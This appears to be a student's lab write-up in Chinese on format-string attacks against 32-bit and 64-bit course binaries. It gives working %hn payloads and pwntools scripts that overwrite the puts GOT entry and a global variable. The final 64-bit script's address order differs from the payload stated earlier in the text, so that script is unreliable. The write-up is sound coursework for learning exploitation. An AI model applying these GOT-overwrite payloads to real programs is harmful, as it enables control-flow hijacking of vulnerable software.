解雲暄	3190105871

## 01 fmt32
需要`export LD_LIBRARY_PATH=~/Desktop/ssec/ssec22spring-stu/hw-03/01_fmt32`才可以运行！


### Step 1
找到目标地址：
![image.png](./assets/1650509130813-60c7cb02-8143-4ff9-97b4-26c21ee99be5.png)


#### Trial 1
本来想通过更改 `ret addr` 劫持控制流，但是由于每次栈的位置不一样，因此每次 `ret addr` 的位置也不一样，所以这种方法可能不太现实：
![image.png](./assets/1650500128985-1b480e7e-259f-495e-9206-fde60493058b.png)

![image.png](./assets/1650504324949-de31acef-4830-497e-9d58-7a319948f63a.png)


#### Trial 2
下面我们试图更改 got 表；鉴于 `printf` 后面调用的是 `puts`，因此我们首先找到 `puts` 的 got 表信息：
![image.png](./assets/1650502903319-f070c285-4931-410e-af7e-318fbecfe806.png)
因此，我们希望将 0x0804d0a8 位置的值改为 0x0804a279

运行一下程序，输入 `AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.`，查看偏移：
![image.png](./assets/1650507177666-ef7fab1a-de95-4353-bc4e-96b8d2f8298b.png)
可以发现，偏移是 7。

因此我们设计了如下的结构：
![image.png](./assets/1650509032933-3e81b015-9a1a-48f7-9964-3c166856d898.png)
其中，2044 = 0x804 - 8，39541 = 0xa279 - 2052，最开始的 -8 是两个地址的字节数。<br />即，payload 是：
```python
puts_got = 0x0804d0a8 
payload = p32(puts_got + 2) + p32(puts_got) + b'%2044x%7$hn%39541x%8$hn' 
```
得到了 Try harder！
![image.png](./assets/1650508968266-6725ac36-0440-4802-853f-14e6bb5caae3.png)


### Step 2
Step 2 要求我们进一步将全局变量 `id` 改为 3190105871，即 0xbe25270f。`id`的地址已经在程序中输出了。

由于 0xbe25 = 48677，0x270f = 9999，我们的 payload 中应该放 4 个 `%x`和 4 个地址，其中 4 个 `%x` 的宽度分别是：<br />0x804 - 4 * 4 = **2036**, 0x270f - 0x804 = **7947**, 0xa279 - 0x270f = **31594**,  0xbe25 - 0xa279 = **7084**

这四个宽度对应的地址分别为 puts_got + 2, id_addr, puts_got, id_addr + 2，即 payload 是：
```cpp
payload = p32(puts_got + 2) + p32(id_addr) + p32(puts_got) + p32(id_addr + 2) + b'%2036x%7$hn%7947x%8$hn%31594x%9$hn%7084x%10$hn' 
```
得到了正确结果！
![image.png](./assets/1650536724218-b1f563c6-3921-49be-a489-a2d684cfae96.png)


### Notes
调试过程中遇到了 `__GI___ctype_init()` 中出现段错误的问题，Google 了一下发现了如下的 bug：[https://github.com/Gallopsled/pwntools/issues/1783](https://github.com/Gallopsled/pwntools/issues/1783)，于是换用 `gdb.attach()`实现调试，而不是之前的 `gdb.debug()`。


### Code
```cpp
from pwn import *
context.log_level = 'DEBUG'

conn = process('./echo')
#gdb.attach(conn, 'b *0x0804a7b2')

id_addr = conn.recvline()
id_addr = int(id_addr[-9:-1], 16)

#import time
#time.sleep(5)		# for debug, in case that the process terminates
					# before gdb.attach() to insert the breakpoint.

conn.recvuntil("...\n")
puts_got = 0x0804d0a8 
#payload = p32(puts_got + 2) + p32(puts_got) + b'%2044x%7$hn%39541x%8$hn' 
payload = p32(puts_got + 2) + p32(id_addr) + p32(puts_got) + p32(id_addr + 2) + b'%2036x%7$hn%7947x%8$hn%31594x%9$hn%7084x%10$hn' 
conn.sendline(payload)

conn.interactive()
```


## 02 fmt64
需要`export LD_LIBRARY_PATH=~/Desktop/ssec/ssec22spring-stu/hw-03/02_fmt64`。

和前一个题目一样，找到相关信息：
![image.png](./assets/1650537163345-3259d569-d217-4c74-bd34-26c870031e00.png)
![image.png](./assets/1650537210862-bcae39ce-1658-49be-9fbd-fccf519e59c2.png)
即希望将 0x604068 位置的值改为 0x0000 0000 0040 29b4；按 `%hn` 放的话 0x604068 放 0x29b4，0x60406a 放 0x40，0x60406c 按 `%n` 放 0 就好了。后面我们还需要将全局变量 `id` 改为 3190105871，即 0xbe25270f，那么可以在 id_addr + 2 放 0xbe25，在 id_addr 放 0x270f。将这些要填的东西从小到大排列一下，就是：`0, 0x40, 0x270f, 0x29b4, 0xbe25`。

另外考察 `va_list` 到 `buf` 的偏移：
![image.png](./assets/1650537848055-0c9b6470-1f65-414c-9911-2b11593174c0.png)
可以发现，偏移是 6。


### 思考题
> 阐述 32 位 fsb 攻击和 64 位 fsb 攻击存在的主要区别，能不能直接将 32 位的攻击方式用到 64 位上呢？为什么？

不能。<br />实验中可以发现的问题是，由于 64 位下地址会有前导 0；而 0 是字符串结束的标志。`printf()`打印到 0 的时候就会结束，因此如果我们像 32 位那样将地址放在 payload 的前面的话输出到 0 就会停下来，后面的 `%n` 之类的东西就运行不到了。所以我们需要将这些格式控制字符串往前放。<br />另外还存在的区别是，64 位和 32 位的传参方式不一样，64 位下函数调用的前 6 个参数存在寄存器里；当然这道题中我们暂时不需要考虑这个区别。


### 解题过程
之前分析了，我们希望将 0x604068 位置的值改为 0x0000 0000 0040 29b4；按 `%hn` 在 0x604068 放 0x29b4，0x60406a 放 0x40，0x60406c 按 `%n` 放 0 就好了。<br />但是，我们要在 payload 中放地址 0x604068，实际上会放成 `0x0000 0000 0060 4068`，如同思考题中我们分析的那样，这会使得 printf 在在这里直接结束，因此我们需要将地址放在 `%n` 之类的东西后面。（就会很难算 TAT）

我们构造这样的 payload 结构：
![image.png](./assets/1650545911896-980cfdc4-5f6e-46ee-a802-e33be75b2979.png)
注意到这个 payload 本身会被视为参数列表的一部分，因此我们需要将内容保持 8 字节偏移。我们算出前面部分共 51 个字节，为了保证偏移，我们补充了 5 个 `'A'` 用来填充。<br /> <br />即，我们的 payload 就是：
```cpp
payload = b'%13$n%64x%14$hn%9935x%15$hn%677x%16$hn%38001x%17$hnAAAAA' + p64(puts_got + 4) + p64(puts_got + 2) + p64(id_addr) + p64(puts_got) + p64(id_addr + 2)
```
得到了正确结果！
![image.png](./assets/1650546117657-e88728ca-400d-48a0-87b1-f45dc742e767.png)

等价地，也可以构造这样的 payload 结构：
![image.png](./assets/1650548707837-013b9e86-309e-4a41-a995-6d545d3f2b2d.png)
这样的 payload 结构让每个格式控制字符串中的单元都占 8 个字节。<br />为什么 $7 是 %57x 呢？本来我们需要 %64x，但是截至 $8 的 %hn 之前，我们总共会输出 7 个 `'A'`，即 $6 三个、$7 四个，所以这里是 64 - 7 = 57。其他的差不多！

即，我们的 payload 就是：
```python
payload = b'%15$nAAA%57xAAAA%16$hnAA%9931xAA%19$hnAA%672xAAA%17$hnAA%37998xA%18$hnAA' + p64(puts_got + 4) + p64(puts_got + 2) + p64(puts_got) + p64(id_addr + 2) + p64(id_addr)
```
也可以得到正确结果。


### Code
```cpp
from pwn import *
context.log_level = 'DEBUG'

conn = process('./echo')
gdb.attach(conn, 'b *0x402cb6')

id_addr = conn.recvline()
id_addr = int(id_addr[-7:-1], 16)

#import time
#time.sleep(5)		# for debug, in case that the process terminates
					# before gdb.attach() to insert the breakpoint.

conn.recvuntil("...\n")
puts_got = 0x604068 
payload = b'%13$n%64x%14$hn%9935x%15$hn%677x%16$hn%38001x%17$hnAAAAA' + p64(puts_got + 4) + p64(puts_got + 2) + p64(id_addr + 2) + p64(puts_got) + p64(id_addr + 2)

conn.sendline(payload)

conn.interactive()
```


## Bonus
摸了）
